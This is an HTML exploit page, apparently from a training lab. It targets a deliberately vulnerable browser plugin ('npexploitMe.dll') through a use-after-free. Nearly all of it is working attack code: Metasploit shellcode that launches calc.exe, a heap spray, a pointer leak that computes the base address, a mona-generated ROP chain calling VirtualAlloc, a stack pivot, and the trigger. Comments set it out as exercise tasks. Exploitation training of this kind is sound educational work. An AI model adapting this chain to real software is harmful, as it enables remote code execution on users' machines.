<!--
    Auto-generated test-site
-->
<html>
<head>
<title>Use-After-Free Fig.5 - Exploit</title>
</head>
    <script type="text/javascript">
		

// windows/exec - 200 bytes
		// http://www.metasploit.com
		// EXITFUNC=process, CMD=calc.exe
		var shellcode = "\ue8fc\u0089\u0000\u8960\u31e5\u64d2\u528b\u8b30" +
"\u0c52\u528b\u8b14\u2872\ub70f\u264a\uff31\uc031" +
"\u3cac\u7c61\u2c02\uc120\u0dcf\uc701\uf0e2\u5752" +
"\u528b\u8b10\u3c42\ud001\u408b\u8578\u74c0\u014a" +
"\u50d0\u488b\u8b18\u2058\ud301\u3ce3\u8b49\u8b34" +
"\ud601\uff31\uc031\uc1ac\u0dcf\uc701\ue038\uf475" +
"\u7d03\u3bf8\u247d\ue275\u8b58\u2458\ud301\u8b66" +
"\u4b0c\u588b\u011c\u8bd3\u8b04\ud001\u4489\u2424" +
"\u5b5b\u5961\u515a\ue0ff\u5f58\u8b5a\ueb12\u5d86" +
"\u016a\u858d\u00b9\u0000\u6850\u8b31\u876f\ud5ff" +
"\uf0bb\ua2b5\u6856\u95a6\u9dbd\ud5ff\u063c\u0a7c" +
"\ufb80\u75e0\ubb05\u1347\u6f72\u006a\uff53\u63d5" +
"\u6c61\u2e63\u7865\u0065";

		
 

var heap_chunks;
function heapSpray(rop,shellcode,nopsled)
{ 
	 var chunk_size, headersize, nopsled_len, code;
	 var i, codewithnum;
	 log.innerHTML+="<br><b>Stage 4. HeapSpraay...";
	 chunk_size = 0x40000;
	 headersize = 0x10;
	 nopsled_len = chunk_size - (headersize + rop.length + shellcode.length);
	 while (nopsled.length < nopsled_len)
		nopsled += nopsled;
	 nopsled = nopsled.substring(0, nopsled_len);
	 code = nopsled + rop + shellcode;                             
	 heap_chunks = new Array();
	 for (i = 0 ; i < 3000 ; i++)
	 {
		codewithnum = "w00t" + code; //http://asintsov.blogspot.de/2012/11/heapspray.html
		heap_chunks[i] = codewithnum.substring(0, codewithnum.length);
	 }
	 log.innerHTML+="DONE</b><br>";
 }
		
		
		function calcAddr(inp)
		{
			baseInt=inp-0x000AD300;
			baseInt=baseInt&0xFFFF0000;
			
			
			baseStr=baseInt.toString(16);
			hexStr=inp.toString(16);
			
			log.innerHTML+="<br><b>Stage 1. Getting base addres...</b><br>";
			log.innerHTML+="Leaked pointer is: <font color=#11AAAA>0x"+hexStr+"</font><br>";
			log.innerHTML+="Base   addr    is: <b><font color=#05AAAA>0x"+baseStr+"</font></b><br>";
			
			return baseInt;
			
		}
	
	function buildUnescape(input)
		{
			
			var len=input.length;
			var unescaped="";
			for(i=0;i<len;i++)
			{
			
				var value = ("0000000" + input[i].toString(16));
				value=value.substr((value.length-8),8);
								
				var h1=value.substr(0,2);
				var h2=value.substr(2,2);
				var l1=value.substr(4,2);
				var l2=value.substr(6,2);
				
				//unescaped+="%u"+h2+h1+"%u"+l2+l1;
				unescaped+="%u"+l1+l2+"%u"+h1+h2;
						
			}
		
			return unescaped;
		}
	
function buildNOP(baseAddr)
		{
		
			
		
			var rop=new Array();
			var ropUnescape="";

			rop.push(baseAddr + (0x5bf2b485-0x5BE60000));
			
			ropUnescape=buildUnescape(rop);
						
			return ropUnescape;

		}

	function buildROP3(baseAddr) // STACK PIVOT HERE TASK IS HERE!!!
		{
		
			
		
			var rop=new Array();
			var ropUnescape="";
			
			rop.push(0xfefefafa); //???? mov esp, ecx ( 1D38FED8)
			
			ropUnescape=buildUnescape(rop);
			
			log.innerHTML+="<br><b>Stage 4. Building ROP for stack pivot...</b><br>";
			log.innerHTML+="ROP: <font color=#555000>unescape(\""+ropUnescape+"\");</font><br>";

			
			return ropUnescape;

		}	
		
		
function buildROP(baseAddr)
		{
		
			
		/*
		ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
		--------------------------------------------------------

			def create_rop_chain()

				rop_gadgets = 
				[
					0x5bee1907,	# POP ECX # RETN [npexploitMe.dll] 
					0x5bf32114,	# ptr to &VirtualAlloc() [IAT npexploitMe.dll]
					0x5bed6fb0,	# MOV EAX,DWORD PTR DS:[ECX] # RETN [npexploitMe.dll] 
					0x5bf20010,	# XCHG EAX,ESI # RETN [npexploitMe.dll] 
					0x5be9753b,	# POP EBP # RETN [npexploitMe.dll] 
					0x5bea09bc,	# & xchg eax,esp #  call eax [npexploitMe.dll]
					0x5bf30a13,	# POP EBX # RETN [npexploitMe.dll]  <-- mona fail #1
					0x00000001,	# 0x00000001-> ebx
					0x5be6b76b,	# POP EBX # RETN [npexploitMe.dll] 
					0x00001000,	# 0x00001000-> edx
					0x00000000,	# [-] Unable to find a gadget to clear edx <--- mona fail #2 0x5bef078c
					0x5bede8ee,	# ADD EDX,EBX # POP EBX # RETN 10 [npexploitMe.dll] 
					0x41414141,	# Filler (compensate)
					0x5bee2f4a,	# POP ECX # RETN [npexploitMe.dll] 
					0x41414141,	# Filler (RETN offset compensation)
					0x41414141,	# Filler (RETN offset compensation)
					0x41414141,	# Filler (RETN offset compensation)
					0x41414141,	# Filler (RETN offset compensation)
					0x00000040,	# 0x00000040-> ecx
					0x5beb8aaa,	# POP EDI # RETN [npexploitMe.dll] 
					0x5bf2b485,	# RETN (ROP NOP) [npexploitMe.dll]
					0x5bf2b484,	# POP EAX # RETN [npexploitMe.dll] 
					0x90909090,	# nop
					0x5bf2b47c,	# PUSHAD # RETN [npexploitMe.dll] 
				# rop chain generated with mona.py
				# note : this chain may not work out of the box
				# you may have to change order or fix some gadgets,
				# but it should give you a head start
				].flatten.pack("V*")

				return rop_gadgets

			end
		*/ 
		
		//for Bbase addr- 0x5BE60000

			var rop=new Array();
			var ropUnescape="";
			
			rop.push(baseAddr + (0x5bee1907-0x5BE60000));
			rop.push(baseAddr + (0x5bf32114-0x5BE60000));
			rop.push(baseAddr + (0x5bed6fb0-0x5BE60000));
			rop.push(baseAddr + (0x5bf20010-0x5BE60000));
			rop.push(baseAddr + (0x5be9753b-0x5BE60000));
			rop.push(baseAddr + (0x5bea09bc-0x5BE60000));
			rop.push(baseAddr + (0x5be6b76b-0x5BE60000));
			
			rop.push(0x01000);
			
			rop.push(baseAddr + (0x5bef078c-0x5BE60000)); 
			
			rop.push(baseAddr + (0x5bede8ee-0x5BE60000));
			
			rop.push(0x01);
			
			rop.push(baseAddr + (0x5bee2f4a-0x5BE60000));
			
			rop.push(0x41414142);
			rop.push(0x41414143);
			rop.push(0x41414144);
			rop.push(0x41414145);
			
			rop.push(0x40);
			
			rop.push(baseAddr + (0x5beb8aaa-0x5BE60000));
			rop.push(baseAddr + (0x5bf2b485-0x5BE60000)); //ROP-NOP
			rop.push(baseAddr + (0x5bf2b484-0x5BE60000));
			
			rop.push(0x90909090);
			
			rop.push(baseAddr + (0x5bf2b47c-0x5BE60000));
			
			ropUnescape=buildUnescape(rop);
			
			log.innerHTML+="<br><b>Stage 2. Building ROP...</b><br>";
			log.innerHTML+="ROP: <font color=#558822>unescape(\""+ropUnescape+"\");</font><br>";

			
			return ropUnescape;

		}







	
        function startExploit()
        {
           if(vulnPlugin2.valid){
             //////////////////////////////////////////// 
			 vulnPlugin2.InitRed(31337,0x31333331);
			 var a =  vulnPlugin2.CallRed();
			 alert(a);
			 
			 vulnPlugin2.FreeRed();
			 /// TASK1: Exploit Leak
			 vulnPlugin2.InitOther(31338,0x31333331);
			 a=vulnPlugin2.CallRed();
			 
			 var baseAddr=calcAddr(a);
			 //////////////////////////////////////////
			 
			 var rop=buildROP(baseAddr);	
             
			 var stackPivotPointer=buildROP3(baseAddr); // TASK2: If crash, make stackPivot
			 
			 //Stage 3. HeapSpray
			 var nop=buildNOP(baseAddr);
			 heapSpray(unescape(rop),shellcode,unescape(nop));
			 
			 //////////////////////////////////////////
			 vulnPlugin2.InitRed(31337,0x31333331);
			 vulnPlugin2.FreeRed();
			 
			 
			 
			 vulnPlugin2.InitString("0011"+unescape(stackPivotPointer)); // TASK: Why no crash? Fix it!
 
		
			 
			 //////
			 alert('Ready?');
			 vulnPlugin2.CallRed(); //Fire!
			 
			 
            } else {
                alert("Plugin is not working :(");
            }
        }
	
</script>
<body onload="">
<div id="log"></div>
<object id="vulnPlugin2" type="application/x-exploitme" width="300" height="300">
</object>

<br />
    
<a href="#" onclick="javascript:startExploit()">Click me!</a> <br />

</body>
</html>
